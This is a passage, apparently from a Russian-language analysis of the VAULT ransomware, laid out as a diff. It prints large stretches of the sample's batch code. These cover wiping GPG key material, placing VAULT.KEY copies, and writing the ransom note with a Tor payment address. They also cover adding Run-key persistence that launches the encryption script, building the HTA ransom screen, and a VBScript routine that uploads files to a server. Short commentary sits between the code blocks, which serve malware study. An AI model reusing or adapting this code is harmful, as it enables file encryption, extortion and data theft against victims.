+echo FHASH-!2162ea2b!&gt;&gt; "%temp%\VAULT.KEY"
+NB:Перед шифрованием из файла %temp%\03dfb98e.7087b06e импортируется открытый ключ злоумышленников. Утилита GPG опознает ключ как принадлежащий пользователю VaultCrypt:
+Больше никаких внешних ключей в GPG не импортируется, однако вначале скрипт пытается зашифровать ключевой файл, используя ключ пользователя recipient:"%temp%\gpg.exe" -r recipient  --yes -q --no-verbose --trust-model always -o "%temp%\VAULT.KEY" -e "%temp%\3637bf69.36ddf8fe"
+
+Естественно, эта попытка терпит неудачу. Зачем это делается и какую функцию выполняет ключ пользователя recipient — так и осталось для меня загадкой.
+Неужели недоработка?
+Затем вся информация GPG о закрытом ключе тщательно затирается несколько раз. Файлы, используемые утилитой GPG в работе, удаляются.
+Файлы VAULT.KEY и CONFIRMATION.KEY копируются из папки %temp% в AppData и на рабочий стол (%userprofile%\Desktop). Кроме того, в папке %temp% создается резервная копия VAULT.KEY с именем 4077430c_VAULT.KEY, куда дописываются маркеры успешного завершения работы скрипта.Код:echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt; "%temp%\secring.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\secring.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\secring.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\secring.qpq"
+move /y "%temp%\secring.qpq" "%temp%\secring.gpg"
+echo 9767d548 3a3b7af16d0f24b8 6d997bc025ca7a7c 7bff218e4077430c&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 071faa5ef941ecc1 ca70214e1e7597484c2e533d97cf86b0e479bce7&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo acda3f33 ca70214e 91c09c6030cb056a cb2f4cf2 7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\36ddf8fe3637bf69.qpq"
+move /y "%temp%\36ddf8fe3637bf69.qpq" "%temp%\3637bf69.36ddf8fe"
+echo 59665d79acda3f3369aca9093c843d11 a3811a181107cc4cc68cd952&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo 9767d5483a3b7af1 6d0f24b86d997bc025ca7a7c7bff218e4077430c&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+echo 77406a1e885873e930cb056a91c09c60 25ca7a7cd21f132ab320494e&gt;&gt; "%temp%\9767d5488f9c3dbb.qpq"
+move /y "%temp%\9767d5488f9c3dbb.qpq" "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\secring.gpg"
+del /f /q "%temp%\3637bf69.36ddf8fe"
+del /f /q "%temp%\8f9c3dbb.9767d548"
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\trustdb.gpg"
+del /f /q "%temp%\secring.gpg"
+del /f /q "%temp%\*.lock"
+del /f /q "%temp%\*.bak"
+attrib -s -h -r "%AppData%\gnupg\*.*"
+attrib -s -h -r "%AppData%\gnupg"
+del /f /q "%AppData%\gnupg\*.*"
+rmdir /s /q "%AppData%\gnupg"
+copy /y "%temp%\CONFIRMATION.KEY" "%appdata%\CONFIRMATION.KEY"
+copy /y "%temp%\VAULT.KEY" "%appdata%\VAULT.KEY"
+copy /y "%temp%\VAULT.KEY" "%temp%\4077430c_VAULT.KEY"
+echo 01FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 02FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 03FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 04FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo 05FNSH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+echo FHASH-OK&gt;&gt; "%temp%\4077430c_VAULT.KEY"
+attrib +r "%temp%\4077430c_VAULT.KEY"
+copy /y "%temp%\VAULT.KEY" "%userprofile%\Desktop\VAULT.KEY"
+
+Далее в папке %temp% создается файл vault.txt, содержащий инструкции по получению ключа шифрования. После записи в этот файл всех указаний он копируется на рабочий стол пользователя и помечается атрибутом «скрытый».Код:echo.&gt; "%temp%\VAULT.txt"
+echo Ваши рабочие документы и базы данных были заблокированы и помечены форматом .vаult &gt;&gt; "%temp%\VAULT.txt"
+
+echo Для их восстановления необходимо получить уникальный ключ&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo   ПРОЦЕДУРА ПОЛУЧЕНИЯ КЛЮЧА: &gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo КРАТКО&gt;&gt; "%temp%\VAULT.txt"
+echo 1. Перейдите на наш веб-ресурс&gt;&gt; "%temp%\VAULT.txt"
+echo 2. Гарантированно получите Ваш ключ&gt;&gt; "%temp%\VAULT.txt"
+echo 3. Восстановите файлы в прежний вид&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ДЕТАЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 1:&gt;&gt; "%temp%\VAULT.txt"
+echo Скачайте Tor браузер с официального сайта: http://torproject.org&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 2:&gt;&gt; "%temp%\VAULT.txt"
+echo Используя Tor браузер посетите сайт: http://restoredz4xpmuqr.onion&gt;&gt; "%temp%\VAULT.txt"
+echo   Шаг 3:&gt;&gt; "%temp%\VAULT.txt"
+echo Найдите Ваш уникальный VAULT.KEY на компьютере - это Ваш ключ к личной клиент-панели. Не удалите его&gt;&gt; "%temp%\VAULT.txt"
+echo Авторизируйтесь на сайте используя ключ VAULT.KEY&gt;&gt; "%temp%\VAULT.txt"
+echo Перейдите в раздел FAQ и ознакомьтесь с дальнейшей процедурой&gt;&gt; "%temp%\VAULT.txt"
+echo   STEP 4:&gt;&gt; "%temp%\VAULT.txt"
+echo После получения ключа, Вы можете восстановить файлы используя наше ПО с открытым исходным кодом или же безопасно использовать своё ПО&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo ДОПОЛНИТЕЛЬНО&gt;&gt; "%temp%\VAULT.txt"
+echo a^) Вы не сможете восстановить файлы без уникального ключа ^(который безопасно хранится на нашем сервере^)&gt;&gt; "%temp%\VAULT.txt"
+echo b^) Если Вы не можете найти Ваш VAULT.KEY, поищите во временной папке TEMP &gt;&gt; "%temp%\VAULT.txt"
+echo c^) Ваша стоимость восстановления не окончательная, пишите в чат&gt;&gt; "%temp%\VAULT.txt"
+echo.&gt;&gt; "%temp%\VAULT.txt"
+echo   Дата блокировки: %date% ^(%time:~0,5%^)&gt;&gt; "%temp%\VAULT.txt"
+copy /y "%temp%\VAULT.txt" "%userprofile%\Desktop\vault.txt"
+attrib +h "%userprofile%\Desktop\vault.txt"
+
+Далее скрипт создает еще один JS-файл (%temp%\e33176c1.js), который запускает на выполнение скрипт %temp%\4c2e533d.cmd, содержащий подпрограмму шифрования файлов.
+После создания JS-файла в GPG импортируется открытый ключ, созданный в начале работы скрипта (как раз этим ключом будут шифроваться все файлы). В реестр добавляются несколько команд автозапуска — в том числе, запуск процедуры шифрования (%temp%\e33176c1.js) при загрузке системы.Код:echo var cdp="%%TeMp%%\\4c2e533d.cmd";var WshShell=CreateObject("WScript.Shell");cdp=WshShell.ExpandEnvironmentStrings(cdp);function CreateObject(fq){return new ActiveXObject(fq)}function xx(cdp){WshShell.Run(cdp,0,0);}xx(''+cdp+'');&gt;&gt; "%temp%\e33176c1.js"
+"%TEMP%\gpg.exe" --import "%TEMP%\pubring.gpg"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /t REG_SZ /f /d "notepad %temp%\VAULT.txt"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /t REG_SZ /f /d "attrib -h %userprofile%\Desktop\vault.txt"
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /t REG_SZ /f /d "wscript //B //Nologo %temp%\e33176c1.js"
+4.4 Шифрование файлов
+К этому моменту скрипт шифрования файлов уже подготовлен, теневые копии удалены, закрытый ключ зашифрован, ключевая информация затерта.
+Наконец-то запускается созданный скрипт шифрования файлов. Понеслась, хо-хо!call "%temp%\4c2e533d.cmd"
+4.5 Подготовка сообщения для пользователя
+Следующий шаг — создание HTML-страницы, которая будет отображаться на экране пользователя при попытке открыть файл с расширением «vault».Код:echo ^&lt;html^&gt;^&lt;head^&gt;^&lt;hta:application BORDER = "none" CAPTION = "No" CONTEXTMENU = "Yes" INNERBORDER = "No" MAXIMIZEBUTTON = "No" MINIMIZEBUTTON = "No" NAVIGABLE = "No" SCROLL = "No" SCROLLFLAT = "No" SELECTION = "Yes" SHOWINTASKBAR = "No" SINGLEINSTANCE = "Yes" SYSMENU = "No"/^&gt;^&lt;style^&gt;body{cursor:default;background-color:#E7E7E7;margin:0;font-family:"HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;text-align:center;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAgMAAADUJKRdAAAACVBMVEXs7Ozv7+/6+vqH/Ct2AAAAW0lEQVQI11WOsQ2DABADv8gAGQFd4SJTZARGQC5cMBX1T0mD4ClP9lmutf71qW/t3d19VBLDcrNR7KV+F4Mx28OKyMzf/UDINvYADR9A08cwfcnjDwmarOBn7wSqEUpFZuJdBQAAAABJRU5ErkJggg==)}.vaustyle{margin:10px;height:520px;width:1100px}.sc{margin:10px 150px;font-size:40px;width:900px;padding:20px;background-color:#7a7a7a;color:#FF4C4C;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}.briefly{position:absolute;left:50px;width:480px}.detailed{display:inline-block;margin-left:530px;width:660px}.bti{background-color:#DFDFDF;color:#555;font-size:28px;padding:10px}hr{width:90%%}.sced{margin-top:15px;text-align:center;font-size:27px;height:220px;padding:20px;background-color:#6a6a6a;line-height:1.5;color:#EAEAEA;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}form{display:inline}.dbutt{margin-left:2px;font-size:16px;font-weight:500;border:none;background-color:#9f9f9f;color:#EEE;cursor:pointer}.footer{text-align:left;position:relative;width:600px;margin:2px 2px 2px 45px;height:16px;font-size:15px;background-color:#CFCFCF;color:#444;padding:6px}.fnl{font-size:21px}^&lt;/style^&gt;^&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/^&gt;^&lt;title^&gt;Vault Notification^&lt;/title^&gt;^&lt;script language="vbscript"^&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo sub Window_Onload&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.resizeTo 1280,725&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo screenWidth = Document.ParentWindow.Screen.AvailWidth&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo screenHeight = Document.ParentWindow.Screen.AvailHeight&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo posLeft = (screenWidth - 1280) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo posTop = (screenHeight - 725) / 2 &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo window.moveTo posLeft, posTop &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo end sub &gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+echo ^&lt;/script^&gt;^&lt;/head^&gt;^&lt;body scroll="no"^&gt;^&lt;div class="vaustyle"^&gt;^&lt;div class="sc"^&gt;Ваши документы и базы данных были зашифрованы и помещены в^&lt;br^&gt;^☢^ ^&lt;b^&gt;формат .VAULT^&lt;/b^&gt;^ ^☢^&lt;/div^&gt;^&lt;div class="sc" style="font-size:20px;width:800px;margin-left:200px;color:#EAEAEA;"^&gt;Для их восстановления необходимо получить ^&lt;b^&gt;Ваш ключ^&lt;/b^&gt;^&lt;/div^&gt;^&lt;br^&gt;^&lt;div class="briefly"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Кратко:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Необходимо произвести 3 шага:^&lt;hr^&gt; ^➠ Перейдите на наш веб-ресурс^&lt;br^&gt; ^Ⓑ Получите свой ключ^&lt;br^&gt;^⤷ ^&lt;b^&gt;Восстановите файлы^&lt;/b^&gt;^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="detailed"^&gt;^&lt;div class="bti"^&gt;^&lt;b^&gt;Детально:^&lt;/b^&gt;^&lt;/div^&gt;^&lt;div class="sced"^&gt;Скачайте ^&lt;b^&gt;Tor^&lt;/b^&gt; браузер с оф. сайта ^&lt;form action="http://dist.torproject.org/torbrowser/4.5.2/torbrowser-install-4.5.2_ru.exe"^&gt;^&lt;input class="dbutt" type="submit" value="⇣ Загрузить"^&gt;^&lt;/form^&gt;^&lt;form action="https://www.torproject.org/projects/torbrowser.html.en#windows"^&gt;^&lt;input class="dbutt" type="submit" value="Help" style="padding-bottom:1px;"^&gt;^&lt;/form^&gt;^&lt;hr^&gt;Перейдите на наш сайт ^&lt;b^&gt;используя Tor^&lt;/b^&gt;:^&lt;br^&gt;^&lt;div class="bti" style="margin:1px 8%%;padding:0px;cursor:text;"^&gt;http://restoredz4xpmuqr.onion^&lt;/div^&gt;^&lt;form action="http://pastebin.com/rs7jZ0TW"^&gt;^&lt;input class="dbutt" type="submit" value="Не работает?"^&gt;^ ^⤴^&lt;/form^&gt;^&lt;hr^&gt;^&lt;div class="fnl"^&gt;Авторизируйтесь ^ ^➤^  ^&lt;b^&gt;Прочитайте отзывы^&lt;/b^&gt; ^ ^➤^  Ключ^&lt;/div^&gt;^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 1:^&lt;/b^&gt; Вы не сможете восстановить файлы без уникального ключа.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 2:^&lt;/b^&gt; Перед авторизацией, Вы ^&lt;u^&gt;должны^&lt;/u^&gt; найти Ваш ^&lt;b^&gt;VAULT.KEY^&lt;/b^&gt; на компьютере.^&lt;/div^&gt;^&lt;div class="footer"^&gt;^&lt;b^&gt;Note 3: Стоимость полного восстановления на ресурсе не окончательная^&lt;/div^&gt;^&lt;/div^&gt;^&lt;/body^&gt;^&lt;/html^&gt;&gt;&gt; "%temp%\ddae25beb5b57d6e.hta"
+copy /y "%temp%\ddae25beb5b57d6e.hta" "%appdata%\ddae25beb5b57d6e.hta"
+del /f /q "%temp%\4c2e533d.cmd"
+attrib +h "%appdata%\ddae25beb5b57d6e.hta"
+attrib +r +s "%temp%\VAULT.KEY"
+attrib +r +s "%appdata%\VAULT.KEY"
+attrib +r +s "%userprofile%\Desktop\VAULT.KEY"
+Отформатированный HTML:&lt;html&gt;
+  &lt;head&gt;
+    &lt;hta:application BORDER = "none" CAPTION = "No" CONTEXTMENU = "Yes" INNERBORDER = "No" MAXIMIZEBUTTON = "No" MINIMIZEBUTTON = "No" NAVIGABLE = "No" SCROLL = "No" SCROLLFLAT = "No" SELECTION = "Yes" SHOWINTASKBAR = "No" SINGLEINSTANCE = "Yes" SYSMENU = "No"/&gt;
+      &lt;style&gt;body{cursor:default;background-color:#E7E7E7;margin:0;font-family:"HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;text-align:center;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAgMAAADUJKRdAAAACVBMVEXs7Ozv7+/6+vqH/Ct2AAAAW0lEQVQI11WOsQ2DABADv8gAGQFd4SJTZARGQC5cMBX1T0mD4ClP9lmutf71qW/t3d19VBLDcrNR7KV+F4Mx28OKyMzf/UDINvYADR9A08cwfcnjDwmarOBn7wSqEUpFZuJdBQAAAABJRU5ErkJggg==)}.vaustyle{margin:10px;height:520px;width:1100px}.sc{margin:10px 150px;font-size:40px;width:900px;padding:20px;background-color:#7a7a7a;color:#FF4C4C;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}.briefly{position:absolute;left:50px;width:480px}.detailed{display:inline-block;margin-left:530px;width:660px}.bti{background-color:#DFDFDF;color:#555;font-size:28px;padding:10px}hr{width:90%%}.sced{margin-top:15px;text-align:center;font-size:27px;height:220px;padding:20px;background-color:#6a6a6a;line-height:1.5;color:#EAEAEA;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAJ0lEQVR42mXMsQkAAAzDMH+S/69M6VAoeAgGDQFIW/4QQARbwaF+B3+SPGAo8blgAAAAAElFTkSuQmCC)}form{display:inline}.dbutt{margin-left:2px;font-size:16px;font-weight:500;border:none;background-color:#9f9f9f;color:#EEE;cursor:pointer}.footer{text-align:left;position:relative;width:600px;margin:2px 2px 2px 45px;height:16px;font-size:15px;background-color:#CFCFCF;color:#444;padding:6px}.fnl{font-size:21px}
+      &lt;/style&gt;
+      &lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/&gt;
+      &lt;title&gt;Vault Notification&lt;/title&gt;
+      &lt;script language="vbscript"&gt;
+        sub Window_Onload
+        window.resizeTo 1280,725
+        screenWidth = Document.ParentWindow.Screen.AvailWidth
+        screenHeight = Document.ParentWindow.Screen.AvailHeight
+        posLeft = (screenWidth - 1280) / 2 
+        posTop = (screenHeight - 725) / 2 
+        window.moveTo posLeft, posTop 
+        end sub 
+      &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body scroll="no"&gt;
+    &lt;div class="vaustyle"&gt;
+      &lt;div class="sc"&gt;
+        Ваши документы и базы данных были зашифрованы и помещены в&lt;br&gt;☢ &lt;b&gt;формат .VAULT&lt;/b&gt; ☢
+      &lt;/div&gt;
+      &lt;div class="sc" style="font-size:20px;width:800px;margin-left:200px;color:#EAEAEA;"&gt;
+        Для их восстановления необходимо получить &lt;b&gt;Ваш ключ&lt;/b&gt;
+      &lt;/div&gt;
+      &lt;br&gt;
+      &lt;div class="briefly"&gt;
+        &lt;div class="bti"&gt;
+          &lt;b&gt;Кратко:&lt;/b&gt;
+        &lt;/div&gt;
+        &lt;div class="sced"&gt;
+          Необходимо произвести 3 шага:&lt;hr&gt; ➠ Перейдите на наш веб-ресурс&lt;br&gt; Ⓑ Получите свой ключ&lt;br&gt;⤷ &lt;b&gt;Восстановите файлы&lt;/b&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+      &lt;div class="detailed"&gt;
+        &lt;div class="bti"&gt;
+          &lt;b&gt;Детально:&lt;/b&gt;
+        &lt;/div&gt;
+        &lt;div class="sced"&gt;Скачайте &lt;b&gt;Tor&lt;/b&gt; браузер с оф. сайта 
+          &lt;form action="http://dist.torproject.org/torbrowser/4.5.2/torbrowser-install-4.5.2_ru.exe"&gt;
+            &lt;input class="dbutt" type="submit" value="⇣ Загрузить"&gt;
+          &lt;/form&gt;
+          &lt;form action="https://www.torproject.org/projects/torbrowser.html.en#windows"&gt;
+            &lt;input class="dbutt" type="submit" value="Help" style="padding-bottom:1px;"&gt;
+          &lt;/form&gt;
+          &lt;hr&gt;Перейдите на наш сайт &lt;b&gt;используя Tor&lt;/b&gt;:&lt;br&gt;
+          &lt;div class="bti" style="margin:1px 8%%;padding:0px;cursor:text;"&gt;
+            http://restoredz4xpmuqr.onion
+          &lt;/div&gt;
+          &lt;form action="http://pastebin.com/rs7jZ0TW"&gt;
+            &lt;input class="dbutt" type="submit" value="Не работает?"&gt; ⤴
+          &lt;/form&gt;&lt;hr&gt;
+          &lt;div class="fnl"&gt;
+            Авторизируйтесь  ➤  &lt;b&gt;Прочитайте отзывы&lt;/b&gt;  ➤  Ключ
+          &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="footer"&gt;
+          &lt;b&gt;Note 1:&lt;/b&gt; Вы не сможете восстановить файлы без уникального ключа.
+        &lt;/div&gt;
+        &lt;div class="footer"&gt;
+          &lt;b&gt;Note 2:&lt;/b&gt; Перед авторизацией, Вы &lt;u&gt;должны&lt;/u&gt; найти Ваш &lt;b&gt;VAULT.KEY&lt;/b&gt; на компьютере.
+        &lt;/div&gt;
+        &lt;div class="footer"&gt;
+          &lt;b&gt;Note 3: Стоимость полного восстановления на ресурсе не окончательная
+        &lt;/div&gt;
+      &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+NB:Документ невалидный…
+Интересно, а он должен вообще быть валидным?Картинка:4.6 Скачивание и запуск утилиты с сервера злоумышленников (не функционирует)
+Напоследок осталась часть кода после метки :6d0f24b8.Неотформатированный код::6d0f24b8
+echo do_vbsUpload &gt; "%temp%\77406a1e.vbs"
+echo Sub do_vbsUpload^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileName,DestURL,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo FieldName="FileField" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim aCounter,Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo For Each Arg In WScript.Arguments &gt;&gt; "%temp%\77406a1e.vbs"
+echo Select Case aCounter &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 1: FileName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 2: DestURL=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo Case 3: FieldName=Arg &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Select &gt;&gt; "%temp%\77406a1e.vbs"
+echo aCounter=aCounter+1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo UploadFile DestURL,FileName,FieldName &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub UploadFile^(DestURL,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const Boundary="---------------------------0123456789012" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FileContents,FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo FileContents=GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo IEPostBinaryRequest DestURL,FormData,Boundary &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function BuildFormData^(FileContents,Boundary,FileName,FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim FormData,Pre,Po &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const ContentType="application/upload" &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre="--"+Boundary+vbCrLf+mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=vbCrLf+"--"+Boundary+"--"+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo Const adLongVarBinary=205 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim RS: Set RS=CreateObject^("ADODB.Recordset"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Fields.Append "b",adLongVarBinary,Len^(Pre^)+LenB^(FileContents^)+Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.AddNew &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim LenData &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(StringToMB^(Pre^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Pre=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo LenData=Len^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(StringToMB^(Po^) ^&amp; ChrB^(0^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Po=RS^("b"^).GetChunk^(LenData^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^)="" &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(Pre^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(FileContents^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS^("b"^).AppendChunk^(Po^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Update &gt;&gt; "%temp%\77406a1e.vbs"
+echo FormData=RS^("b"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo RS.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo BuildFormData=FormData &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function IEPostBinaryRequest^(URL,FormData,Boundary^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim IE: Set IE=CreateObject^("InternetExplorer.Application"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo IE.Navigate URL,,,FormData,_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: multipart/form-data; boundary="+Boundary+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo do While IE.Busy &gt;&gt; "%temp%\77406a1e.vbs"
+echo Wait &gt;&gt; "%temp%\77406a1e.vbs"
+echo Loop &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo IEPostBinaryRequest=IE.Document.body.innerHTML &gt;&gt; "%temp%\77406a1e.vbs"
+echo IE.Quit &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function mpFields^(FieldName,FileName,ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim MPtemplate &gt;&gt; "%temp%\77406a1e.vbs"
+echo MPtemplate="Content-Disposition: form-data; name=""{field}"";"+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo " filename=""{file}"""+vbCrLf+_ &gt;&gt; "%temp%\77406a1e.vbs"
+echo "Content-Type: {ct}"+vbCrLf+vbCrLf &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Out &gt;&gt; "%temp%\77406a1e.vbs"
+echo Out=Replace^(MPtemplate,"{field}",FieldName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Out=Replace^(Out,"{file}",FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo mpFields=Replace^(Out,"{ct}",ContentType^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function GetFile^(FileName^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim Stream: Set Stream=CreateObject^("ADODB.Stream"^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Type=1 &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Open &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.LoadFromFile FileName &gt;&gt; "%temp%\77406a1e.vbs"
+echo GetFile=Stream.Read &gt;&gt; "%temp%\77406a1e.vbs"
+echo Stream.Close &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Function StringToMB^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Dim I,B &gt;&gt; "%temp%\77406a1e.vbs"
+echo For I=1 To Len^(S^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo B=B ^&amp; ChrB^(Asc^(Mid^(S,I,1^)^)^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo Next &gt;&gt; "%temp%\77406a1e.vbs"
